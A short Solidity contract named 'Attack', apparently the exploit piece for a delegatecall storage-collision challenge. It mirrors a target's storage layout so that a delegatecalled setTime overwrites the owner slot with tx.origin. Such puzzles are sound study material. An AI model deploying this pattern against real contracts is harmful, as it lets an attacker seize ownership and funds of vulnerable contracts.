contract Attack {
    // stores a timestamp
    uint256 storedTime;
    uint256 storedTime2;
    address public owner;

    function setTime(uint256 _time) public {
        storedTime = _time;
        storedTime2 = _time;
        owner = tx.origin;
    }
}
